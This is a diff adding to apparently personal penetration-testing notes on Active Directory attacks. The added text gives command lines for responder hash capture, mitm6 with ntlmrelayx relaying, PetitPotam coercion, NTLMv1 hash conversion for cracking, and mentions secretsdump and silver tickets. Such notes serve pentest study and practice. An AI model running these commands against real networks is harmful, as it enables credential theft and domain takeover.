@@ -21,4 +21,62 @@
 		also run:
 			enum4linux dc-ip
 
+#Listen for hashes
+	responder -I eth0 -F
+		you can change challenge in responder.conf to simple (1122334455667788) but it is more easily detectable due to numerous hosts having the same challenge (not normal).
+		downgrade to NTLMv1 --lm
+
+		OR
+
+	mitm6 -d domain.com
+	+
+	ntlmrelayx -6 -t dc-ip -l loot -of hashes
+		this has a lot of functionality, but default will attempt to create a domain admin.
+		https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
+
+
+
+
+#Sprays
+
+
+#Got creds?
+
+
+
+#Explolits
+	petitpotam
+		https://github.com/topotam/PetitPotam?ref=blog.zsec.uk
+	(start responder/ntlmrelayx) python3 petitpotam.py listen-ip target-ip
+		take captured hash and run it through NTLMv1 Multitool to get hash to DES encryption (14000 in hashcat)
+			https://github.com/evilmog/ntlmv1-multi?ref=blog.zsec.uk
+		python3 ntlmv1.py --ntlmv1 <capture hash ^^>
+
+
+
+
+
+#Post exploit / admin
+
+	secretsdump
+
+	silver tickets
+
+	
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
